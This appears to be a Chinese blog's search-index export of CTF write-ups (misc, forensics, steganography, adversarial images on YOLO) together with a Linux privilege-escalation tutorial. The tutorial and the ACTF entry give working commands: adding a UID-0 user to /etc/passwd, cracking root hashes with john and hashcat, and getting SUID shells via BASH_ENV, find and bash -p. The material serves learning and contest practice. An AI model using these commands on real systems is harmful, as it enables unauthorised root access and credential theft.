<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>18届软件创新攻防赛部分wp</title>
    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[1.钓鱼邮件拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：


发现有一个生日礼物.zip，点击下载
下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111


然后发现一个exe，双击运行。
然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe
因为会实时变化，记得要截图看会好看一点。


放大就能看到这个远程地址 222.218.218.218:55555


包上md5得到flag：df3101212c55ea8c417ad799cfc6b509
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>ACMer</title>
    <url>/2024/11/ACMer/</url>
    <content><![CDATA[还没想好写啥

https://www.bilibili.com/video/BV1MoZAYyEUk?t=2.0
]]></content>
      <tags>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title>2024浙江省省赛复现</title>
    <url>/2024/12/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[1.2024浙江省赛复现1.real signin得到一张out.png，用zsteg跑一下发现：


得到
dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc

和
ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/

猜测是换表的base64，解密得到flag：DASCTF{We1C0me_2_ZJCTF2024!}
2.机密文档得到一个加密的压缩包，发现加密方式是store，猜测为明文攻击



[!NOTE]
将一个名为flag.txt的文件打包成ZIP压缩包后，发现文件名称会出现在压缩包文件头中，且偏移固定为30
且默认情况下，flag.zip也会作为该压缩包的名称
已知的明文片段有：
“flag.txt” 8个字节，偏移30
ZIP本身文件头：50 4B 03 04 ，4字节
满足12字节的要求

其中 -C 后面跟的是原本的zip，-c 后面跟的是里面需要解密出来的zip，-x 后面是已知的明文，30 表示偏移量，7468655F7365637265745F796F755F6E657665725F657665725F6B6E6F775F6861686168616861是the_secret_you_never_ever_know_hahahaha的16进制转换，即用010打开后看到的。下一个 -x 0 是zip的偏移量，504B0304是zip的16进制表示。
 可以看到解压出来的keys是
b8edf1ff c1f93a7e f93d08e0

得到三段密钥就可以修改压缩包密码了：


修改了密码为123
解压后得到一个docm文档，猜测是跟宏有关的，wps打开发现


这里可以使用wps里查看宏，也可以olevba看
wps 里查看如下：


olevba 查看如下：


反正最后得到如下宏代码：
Sub key()    Dim decValues As Variant    Dim str As String    Dim result As String    Dim i As Integer    Dim xorValue As Integer        decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)    str = &quot;outguess&quot;    result = &quot;&quot;    For i = LBound(decValues) To UBound(decValues)        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))        result = result &amp; Chr(xorValue)    Next iEnd Sub

可以发现是一个异或代码，可以手搓脚本解密，也可以cyberchef
cyberchef得到如下：


ulhged98BhgVHYp

由于之前提示了是outguess加密，将docm后缀改为zip后在 word &#x2F; media 里拿到图片 image1.jpeg
由于outguess不认识jpeg，需要我们修改后缀名为jpg
![2024-12-08 144645](.&#x2F;2024浙江省省赛复现&#x2F;2024-12-08 144645.png)
得到flag：DASCTF{B1g_S3CR3t_F0R_Y0u}
3.EZtraffic拿到流量分析一下就可以在SMB里发现有传输流量包，导出一下


发现有三个压缩包，但是只有其中一个是final_out，即最后的zip
这里最好不要用foremost和binwalk，因为你会发现导出的压缩包里面会少东西。
打开压缩包发现


注释
NTLM v2 plaintext + \d&#123;5&#125;

这里后来才知道需要提取 NTLMv2 哈希值并破解，可以看lunatic师傅的博客 这里
而且这里 + \d{5} 提示后面再跟五位数字爆破。
这里可以用tshark导出（tshark是kali自带的）
tshark -n -r eztraffic.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid

得到


这里我们需要的是username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response并且需要以这个形式保存到txt里
rockyou #usernameMicrosoftAccount #domaindb12ced50faf52f141636e80205e8f28 #ServerChallenge66aa2c3634e34e6e330949b82d4d2a64 #NTproofstring而modifiedntlmv2response需要我们回到流量里找一下

先过滤
ntlmssp

可以看到很多流,其中有一个是NTLMSSP_AUTH的
在里面找NTLMv2 Response，可以看到


除了NTProofStr以外的就是我们要找的modifiedntlmv2response了（注意这里复制hex值）
最后得到
rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000

将以上的内容保存到hash.txt中，用hashcat爆破，命令
.\hashcat -m 5600 hash.txt rockyou.txt# 5600 表示NetNTLMv2模式# rockyou是github上找的字典，还挺大



得到密码
haticehatice

接下来就是5位掩码爆破了，ARP秒出


得到密码haticehatice12580，解压压缩包，看到有100张图片碎片，猜测是拼图


猜测图片应该是有顺序的，不然也太难拼了
在stegsolve的rad0里看到


QCR扫一下，看到


这里需要我们按照顺序一个个的把图片更改一下
利用脚本拼接一下（脚本抄的。）
from PIL import Imagefrom pyzbar.pyzbar import decodeimport osdef extract_lsb(imgname):    r = []    img = Image.open(imgname)    width,height = img.size    for x in range(width):        for y in range(height):            pixel = img.getpixel((x,y))            r.append(str(pixel[0] &amp; 1))            # print(pixel)    bin_data = &#x27;&#x27;.join(r)    return bin_data              def bin2img(bin_data):    imgname = &quot;tmp.png&quot;    pixels = []    img = Image.new(&quot;RGB&quot;,(50,50))    for item in bin_data:        if item ==&#x27;0&#x27;:            pixels.append((0,0,0))        else :            pixels.append((255,255,255))    img.putdata(pixels)    # img.show()    img = img.resize((500,500))     # 这里调整一下图片的大小，便于后面pyzbar的识别    img.save(imgname)    return imgname        def read_qrcode(imgname):    img = Image.open(imgname)    decode_data = decode(img)    # print(decode_data)    res = decode_data[0].data.decode()    os.remove(imgname)    return res        def rename_img():    filenames = os.listdir(&quot;./final_out&quot;)    for filename in filenames:        try:            src_img = &quot;./final_out/&quot;+filename            bin_data = extract_lsb(src_img)            imgname = bin2img(bin_data)            res = read_qrcode(imgname)            dst_img = f&quot;./final_out/&#123;res&#125;.png&quot;            os.rename(src_img,dst_img)            print(f&quot;[+] &#123;src_img&#125; ===&gt; &#123;dst_img&#125; down!!!&quot;)        except:            print(f&quot;[-] &#123;src_img&#125; Error!!!&quot;)def merge_img():    cols = 10    rows = 10    img_list = []    new_img = Image.new(&quot;RGB&quot;,(500,500))        for i in range(1,101):        img = Image.open(f&quot;./final_out/&#123;i&#125;.png&quot;)        img_list.append(img)            for y in range(rows):        for x in range(cols):            idx = y * cols + x            img = img_list[idx]            x_offset = x * 50            y_offset = y * 50            new_img.paste(img,(x_offset,y_offset))                # new_img.show()    new_img.save(&quot;flag.png&quot;)        if __name__ == &quot;__main__&quot;:    # rename_img()    merge_img()

最后得到




4.FinalSign文章能看到的：
2c243f2f3b3114345d0a0909333f06100143023b2c55020912

可以发现文章里有雪隐写，里面隐写了xor的密码:


接下来cyberchef就能出了




5.非黑即白得到一个没有后缀的文件，010打开发现是逆序的gif
利用puzzlesolver逆序回来，得到gif，再拆分一下发现全是黑白图片：


这里应该是二进制，脚本提取一下（脚本借鉴的。。）:
import hashlibfrom PIL import Imageflag = &#x27;&#x27;hash_lst = &#123;&#125;pixel_list = &#123;&#125;data_list = &quot;&quot;for i in range(1536):    filename = f&quot;&#123;i&#125;.png&quot;    tmp_img = Image.open(filename)    tmp_pixel = tmp_img.getpixel((0,0))[0]    # print(tmp_pixel)    if tmp_pixel &lt; 200:        data_list += &#x27;0&#x27;    else:        data_list += &#x27;1&#x27;print(data_list) 

这个需要放在文件同目录下，得到
010100000100101100000011000001000001010000000000000000010000000000000000000000001110101101011000010110010101100110011101110010111100011110011010001010100000000000000000000000000001111000000000000000000000000000001000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010011110111100011000101111101011100101100011111010111101011001110111011111100000011011000010010111010010100010101110011110000101000000001011101110000101101101111111111010011001000001111111101001010100111110011110011101001100011011000001110111001110001011101111111101100000110101011010110101110101100001001100000100010101011010111100001000001010000010010110000000100000010001111110000000000010100000000000000000100000000000000000000000011101011010110000101100101011001100111011100101111000111100110100010101000000000000000000000000000011110000000000000000000000000000010000000000000100100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010000001010000000000010000000000000000000000000000000000000000000000000000100000000000110000000000001011000011101010101010000000001100010110010011011011011000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000010010110000010100000110000000000000000000000000000000000000000100000000000000010000000001011010000000000000000000000000010100000000000000000000000000000000000000000000

放在cyberchef里可以看到是一个压缩包，下载下来


gif的帧间隔里隐藏了密码


要删除最后一个0，使用 cyberchef 转 ascii 码得到：


用密码解压zip得到flag：DASCTF{H3r3_1s_C0L0rful_W0rld}
6.天命人得到zip里面是6个文件，解压之后用010打开发现是一个zip打乱了顺序分成了6个
脚本使其重新成为一个zip：（这里需要我们手动重命名顺序）
with open(&quot;1&quot;,&quot;rb&quot;) as f:    data1 = f.read()with open(&quot;2&quot;,&quot;rb&quot;) as f:    data2 = f.read()with open(&quot;3&quot;,&quot;rb&quot;) as f:    data3 = f.read()with open(&quot;4&quot;,&quot;rb&quot;) as f:    data4 = f.read()with open(&quot;5&quot;,&quot;rb&quot;) as f:    data5 = f.read()with open(&quot;6&quot;,&quot;rb&quot;) as f:    data6 = f.read()print(len(data1))print(len(data2))print(len(data3))print(len(data4))print(len(data5))print(len(data6))res = []for i in range(387797):    try:        res.append(data1[i])        res.append(data2[i])        res.append(data3[i])        res.append(data4[i])        res.append(data5[i])        res.append(data6[i])    except:        passprint(len(res))with open(&quot;1.zip&quot;,&quot;wb&quot;) as f:    f.write(bytes(res))

得到一个zip，解压出来是两个有密码的zip文件


可以发现根器里面的txt很小，只有4字节，利用crc爆破一下（注意要重命名，不能出现中文


得到：C0M3_4ND_Get_S1X_R00TS!!
解压未竟zip，发现金箍棒图片是要我们手提像素点，利用脚本
import osimport reimport cv2import argparseimport itertoolsimport numpy as npparser = argparse.ArgumentParser()parser.add_argument(&#x27;-f&#x27;, type=str, default=None, required=True,                    help=&#x27;输入文件名称&#x27;)parser.add_argument(&#x27;-p&#x27;, type=str, default=None, required=True,                    help=&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;)parser.add_argument(&#x27;-n&#x27;, type=str, default=None, required=True,                    help=&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;)parser.add_argument(&#x27;-size&#x27;, type=str, default=&#x27;1x1&#x27;, required=False,                    help=&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;)parser.add_argument(&#x27;-resize&#x27;, type=int, default=1, required=False,                    help=&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;)args  = parser.parse_args()if __name__ == &#x27;__main__&#x27;:    if re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.p) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.n) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.size):        x1, y1 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[0].split(&quot;x&quot;))        x2, y2 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[1].split(&quot;x&quot;))        width, height = map(lambda x: int(x), args.n.split(&quot;x&quot;))        width_size, height_size = map(lambda x: int(x), args.size.split(&quot;x&quot;))        img_path = os.path.abspath(args.f)        file_name = img_path.split(&quot;\\&quot;)[-1]        img = cv2.imread(img_path, cv2.IMREAD_COLOR)        row, col = img.shape[:2]        r, c = len(range(y1, y2 + 1, height)), len(range(x1, x2 + 1, width))        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, 3))        for y, x in itertools.product(range(r), range(c)):            for y_size in range(height_size):                for x_size in range(width_size):                    # new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-1)                    # cv2.imshow(new_img)        cv2.imwrite(f&quot;_&#123;file_name&#125;&quot;, new_img)        print(&quot;已保存到运行目录中...&quot;)    else:        print(&quot;参数-p或参数-n或参数-size, 输入错误!&quot;)

python get_pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10

得到：


这个是veracrypt加密的磁盘文件，需要我们挂载
挂载需要密钥。密钥文件


然后点加载,就能在z盘里看到flag

]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2025misc题解</title>
    <url>/2025/04/ACTF2025misc%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[这次比赛完全是被队友带飞，N0wayBack的队友们tql
nowayback链接： Home | N0wayBack
signin又是经典的github找flag，我记得上次也有哪个比赛是github上找东西的。
有个main分支点进去啥也没有，但是看活动记录就发现活动了两次


直接比较变更发现flag




Hard guess

加藤惠猜密码
第一层用户名就是加藤惠的名字KatoMegumi
然后就是猜密码了，看她哪个简介发现说最好不要用姓名+生日，但是最后写了一个”…我猜“
一开始我还猜是不是伦也君的生日，最后才发现是Megumi960923，，
进去之后ls -a发现有一个hello
我们猜测是通过这个 hello 来提权
ida打开发现：


主要利用这一句，bash -c命令执行
我们需要控制一下环境变量，也就是通过bash_env进行提权

前提知识: 在Linux中，.bashrc 被用来初始化交互shell，而BASH_ENV用来初始化非交互shell; 
就是说只要是在 BASH_ENV 变量中写入的语句，在每个shell脚本执行前，都会执行一次。

这里我们只要在bash_env中写入恶意配置的话就可以拿到root shell了
可以这样（星盟的方法，直接拿shell）：
echo &#x27;cp /bin/bash /tmp/root_shell; chmod +xs /tmp/root_shell&#x27; &gt; /tmp/exploitexport BASH_ENV=/tmp/exploit./hello  # 输入 &#x27;n&#x27; 触发 bash -c/tmp/root_shell -p  # 获取 root shell

也可以直接奔着flag去（nk）：
export BASH_ENV=/tmp/test.sh echo &#x27;cat /root/flag &gt; /tmp/root.txt 2&gt;&amp;1&#x27; &gt; /tmp/test.sh/opt/helloncat /tmp/root.txt

就能看到flag了
QQQRcodeexp如下
直接运行就能得到flag——要是所有题都这样就好了
#!/usr/bin/env python3# -*- coding: utf-8 -*-import stringimport hashlibfrom pwn import remote, logimport qrcodeimport pulp# 1. 生成 21×21 二维二维码矩阵def qr_matrix(data: str):    qr = qrcode.QRCode(        version=1,        error_correction=qrcode.constants.ERROR_CORRECT_L,        box_size=1,        border=0    )    qr.add_data(data)    qr.make(fit=False)    mat = qr.get_matrix()  # mat[y][x]    # 转成 [x][y]    return [[1 if mat[y][x] else 0 for y in range(21)] for x in range(21)]front = qr_matrix(&quot;Azure&quot;)left  = qr_matrix(&quot;Assassin&quot;)top   = qr_matrix(&quot;Alliance&quot;)# 2. 建 ILP 并求解prob = pulp.LpProblem(&quot;ctf_3d_qr&quot;, pulp.LpMinimize)p = [[[pulp.LpVariable(f&quot;p_&#123;x&#125;_&#123;y&#125;_&#123;z&#125;&quot;, cat=&quot;Binary&quot;)       for z in range(21)]      for y in range(21)]     for x in range(21)]# 目标：最小化体素数prob += pulp.lpSum(p[x][y][z]                    for x in range(21)                    for y in range(21)                    for z in range(21))# front (XY)for x in range(21):    for y in range(21):        s = pulp.lpSum(p[x][y][z] for z in range(21))        prob += (s &gt;= 1) if front[x][y] else (s == 0)# left (YZ)for y in range(21):    for z in range(21):        s = pulp.lpSum(p[x][y][z] for x in range(21))        prob += (s &gt;= 1) if left[y][z] else (s == 0)# top (XZ)for x in range(21):    for z in range(21):        s = pulp.lpSum(p[x][y][z] for y in range(21))        prob += (s &gt;= 1) if top[x][z] else (s == 0)# 限制总黑点 &lt; 390prob += pulp.lpSum(p[x][y][z]                    for x in range(21)                    for y in range(21)                    for z in range(21)) &lt;= 389prob.solve(pulp.PULP_CBC_CMD(msg=False))# 3. 平展成 9261 位二进制串bits = []for z in range(21):    for y in range(21):        for x in range(21):            bits.append(&#x27;1&#x27; if pulp.value(p[x][y][z]) &gt; 0.5 else &#x27;0&#x27;)data_str = &#x27;&#x27;.join(bits)# 4. 远程连接 + POW + 发送 + 打 flagdef solve():    HOST, PORT = &quot;1.95.71.197&quot;, 9999    r = remote(HOST, PORT, timeout=10)    line = r.recvline().decode().strip()    # e.g. sha256(XXXX+abcdef) == deadbeef...    left_part, target = map(str.strip, line.split(&quot;==&quot;,1))    suffix = left_part.split(&quot;+&quot;,1)[1].rstrip(&quot;)&quot;)    log.info(f&quot;POW suffix = &#123;suffix!r&#125;, target hash = &#123;target&#125;&quot;)    suffix_b = suffix.encode()    # 四重循环暴力破解 4 字符 XXXX    chars = string.ascii_letters + string.digits    found = None    for a in chars:        for b in chars:            for c in chars:                for d in chars:                    xxxx = a+b+c+d                    h = hashlib.sha256()                    h.update(xxxx.encode())                    h.update(suffix_b)                    if h.hexdigest() == target:                        found = xxxx                        break                if found: break            if found: break        if found: break    if not found:        log.error(&quot;BRUTE-POW FAILED&quot;)    log.success(f&quot;FOUND POW = &#123;found&#125;&quot;)    r.sendline(found)    r.recvline()  # &quot;Right!&quot;    r.sendline(data_str)    flag = r.recvline(timeout=5).decode().strip()    print(&quot;\n&gt;&gt;&gt; FLAG:&quot;, flag)if __name__ == &quot;__main__&quot;:    solve()

得到




master of movie电影大师
具体思路是网上找对应的电影，使用谷歌搜图等工具
666这题找半天电影最后发现是环境炸了。。



题目
编号



easy_0
tt0017136


easy_1
tt8893624


easy_2
tt0109946


easy_3
tt17526714


easy_4
tt31309480


easy_5
tt34382036


easy_6
tt8503618


easy_7
tt0368226


easy_8
tt0103767


easy_9
tt0110912


hard_0
没找到


hard_1
tt0109688


hard_2
tt26471411


hard_3
tt0043306


hard_4
tt5004766


其中确信的是（找到的。。）：easy_1：


hard_1：


hard_3：


hard_4：


然后动态验证码的代码：
import hashlibimport itertoolsimport stringtarget_prefix = &quot;a91ee6&quot;suffix = &quot;ipdw8&quot;charset = string.ascii_letters + string.digitsfor candidate in itertools.product(charset, repeat=4):    candidate_str = &#x27;&#x27;.join(candidate)    full_str = candidate_str + suffix    hash_result = hashlib.sha256(full_str.encode()).hexdigest()        if hash_result.startswith(target_prefix):        print(f&quot;Found: &#123;candidate_str&#125;&quot;)        print(f&quot;Hash: &#123;hash_result&#125;&quot;)        break



yolov?-cls目前我还不会，老大（cain）的wp：
。
adv是针对于yolo11x和yolo8x两个模型的，similar标准是L1Loss+Max
比较麻烦的地方在于，第一次上手yolo需要看源码，找到preprocess过程和output逻辑
from ultralytics import YOLOimport numpy as npfrom PIL import Imageimport timeimport base64from io import BytesIOimport torchimport torch.nn as nnfrom torchvision import transformsdevice = torch.device(&#x27;cuda&#x27;if torch.cuda.is_available() else&#x27;cpu&#x27;)print(f&#x27;Using device: &#123;device&#125;&#x27;)modelv11_ori = YOLO(&quot;yolo11x-cls.pt&quot;)modelv8_ori = YOLO(&quot;yolov8x-cls.pt&quot;)modelv11 = modelv11_ori.model.to(device)modelv8 = modelv8_ori.model.to(device)# v11_transforms = modelv11.transforms# v8_transforms = modelv8.transformstransform = transforms.Compose(    [        transforms.Resize(size=224, interpolation=transforms.InterpolationMode.BILINEAR, max_size=None, antialias=True),        transforms.CenterCrop(size=(224, 224)),        transforms.Normalize(mean=torch.tensor([0., 0., 0.]), std=torch.tensor([1., 1., 1.]))    ])tt = transforms.ToTensor()tp = transforms.ToPILImage()pig_ori = Image.open(&quot;pig.png&quot;).convert(&quot;RGB&quot;)pig_tensor = tt(pig_ori).unsqueeze(0).to(device)adv_tensor = pig_tensor.detach().clone()adv_max = pig_tensor + 1.5/255.adv_min = pig_tensor - 1.5/255.adv_max = torch.clamp(adv_max, 0, 1)adv_min = torch.clamp(adv_min, 0, 1)adv_tensor.requires_grad = TrueCE_loss = nn.CrossEntropyLoss().to(device)classaverage_loss(nn.Module):    def__init__(self):        super().__init__()    defforward(self, x, y):        return torch.mean(abs(x - y))L1_loss = average_loss().to(device)for epoch inrange(10000):    inp = transform(adv_tensor)    pred_v11 = modelv11(inp)    pred_v8 = modelv8(inp)        if pred_v11[0][0][341].item() &gt; 0.99and pred_v8[0][0][719].item() &gt; 0.99:        pig_adv = tp(adv_tensor.squeeze(0).cpu())        average_diff = np.mean(        np.abs(            np.array(pig_ori).astype(np.int32) - np.array(pig_adv).astype(np.int32)        ).astype(np.uint8)        )        max_diff = np.max(            np.abs(                np.array(pig_ori).astype(np.int32) - np.array(pig_adv).astype(np.int32)            ).astype(np.uint8)        )        if average_diff &lt; 1or max_diff &lt; 2:            pig_adv.save(f&quot;flag.png&quot;)            exit()        else:            print(f&quot;CHECK FAILED average_diff: &#123;average_diff&#125; max_diff: &#123;max_diff&#125;&quot;)    # len(pred_v11) == 2 , pred_v11[0] is prob, pred_v11[1] is logits    loss_adv = CE_loss(pred_v11[1], torch.tensor([341], device=device)) + CE_loss(pred_v8[1], torch.tensor([719], device=device))    loss_ave = L1_loss(adv_tensor, pig_tensor)    loss = loss_adv + loss_ave    loss.backward()    grad = adv_tensor.grad    adv_tensor.requires_grad = False    adv_tensor.data = adv_tensor.data - grad * 0.1    adv_tensor.clamp_(adv_min, adv_max)    adv_tensor.requires_grad = True    print(f&quot;Epoch &#123;epoch&#125;, Loss: &#123;loss.item():.4f&#125; Current prediction: &#123;pred_v11[0][0][341].item():.4f&#125;, &#123;pred_v8[0][0][719].item():.4f&#125; L1: &#123;loss_ave.item():.4f&#125;&quot;)



















]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux提权浅析</title>
    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[passwd提权/etc/passwd和 /etc/shadow文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 passwd或 shadow文件的内容或权限配置有误，则可以被利用来进行系统提权。
我们先了解一下 /etc/passwd内容的含义：
Linux 密码信息保存在两个文件中，分别为：/etc/passwd和 /etc/shadow
/etc/passwd文件用于保存用户信息，每一行代表一个用户，每一行通过冒号 :分为七个部分:

用户名
密码，若为 x则表示密码保存在/etc/shadow
UID，0 代表 root
GID，表示所在组
描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other
用户主目录
默认 shell 类型

例如，假设 /etc/passwd文件中其中一行信息如下：

其含义解读如下：
​	*用户名：test-user
​	*密码保存在 /etc/shadow中
​	*UID 为 1001
​	*GID 为 1001
​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]
​	*用户主目录为 /home/test-user
​	*默认 shell 为 /bin/bash
因此在登陆时候的权限是通过第三个字段 UID和第四个字段 GID确定。其中 UID=0代表 root 用户
如果我们能够对 /etc/passwd文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。
所以，获取passwd的写入权限十分重要
通常来说，通过 /etc/passwd提权的方法有两种：

如果具有 /etc/passwd的 w (写入) 权限，可以直接添加一个 root 权限的用户
如果 /etc/passwd中存储 root 用户密码哈希，可以使用 john 进行破解

场景一：&#x2F;etc&#x2F;passwd 具有写权限查看
ls -alh /etc/passwd /etc/shadow

如果有 --wx--xrwx 意味着我们具有写入权限，接下来我们需要做的就是
自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 UID设置为 0，此时我们登陆就可以获取 root 权限。
查看 passwd 文件中 root 用户数据的格式
cat /etc/passwd|grep root

结果
root:x:0:0:root:/root:/bin/bash

先设置用户名，如syl-passwd
syl-passwd:x:0:0:root:/root:/bin/bash

设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 openssl套件
使用 openssl创建一个密码为 pass123 的 linux hash，命令如下：
openssl passwd -1 -salt ignite pass123#-1 ：使用 MD5 hash 算法#-salt ：对 hash 算法加 &quot;盐&quot;

计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：
syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash

添加到passwd
echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd#必须使用单引号，不能使用双引号#使用 &gt;&gt;，而不是 &gt;

这样即添加成功，也可以再次查看一下
cat /etc/passwd|grep syl-passwd

接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限
场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash一样查看读写权限
ls -alh /etc/passwd /etc/shadow

但是发现权限配置都是正确的，普通用户只具有 /etc/passwd文件的读权限。
接下来查看 /etc/passwd文件的内容：
cat /etc/passwd

结果发现
root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash

中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了
先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：
echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt# 此处必须单引号

然后就john：
john ~/hash.txt

最后得到密码是hello
接下来就一样了，su root，提权。
shadow提权shadow提权与passwd类似
都是获取root密码的哈希值然后进行爆破
SUID提权什么是suid提权？
SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。
suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。
linux引入了3个文件来管理用户组：

&#x2F;etc&#x2F;passwd存放用户信息。
&#x2F;etc&#x2F;shadow存放用户密码信息。
&#x2F;etc&#x2F;group存放组信息

利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。
如何设置suid列出所有文件：
ls -al

设置suid：
chmod u+s filename #设置suidchmod u-s filename #去除suid

如果文件从-rw变成了-rwS说明添加上了suid权限
注意：

只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义
命令执行者要对该程序文件拥有执行(x)权限才能使用
SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效

具有suid权限的二进制可执行文件有：
nmapvimfindbashmorelessnanocpawk



如何查找查找系统上运行的suid文件，且查找具有root权限的
find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;# /表示从文件系统的顶部（根）开始并找到每个目录# -perm 表示搜索随后的权限# -u = s表示查找root用户拥有的文件# -type表示我们正在寻找的文件类型# f 表示常规文件，而不是目录或特殊文件# 2表示该进程的第二个文件描述符，即stderr（标准错误）# &gt;表示重定向# /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。

查找如下：


ls一下看看是否设置了suid权限
ls -al /usr/bin/su#查看/usr/bin/su有无suid权限

如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。
进行提权这里的前提都是要有suid权限
如果之前查找到的usr/bin/find具有root权限，就用find命令进行提权
findfind filename -exec whoami \; -quit# rootfind filename -exec /bin/sh -p \; -quit# whoami# root# 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su

还有一种差不多的提权方法
#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限touch 1.txt #创建1.txt/usr/bin/find 1.txt -exec whoami \;

好像也可以：
find /etc/passwd -exec /bin/bash -p \;

如果最后出了个root就说明提权成功了
同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：



suid文件
提权命令



&#x2F;usr&#x2F;bin&#x2F;bash
bash -p


&#x2F;usr&#x2F;bin&#x2F;csh
csh -b


&#x2F;usr&#x2F;bin&#x2F;sh
sh -p


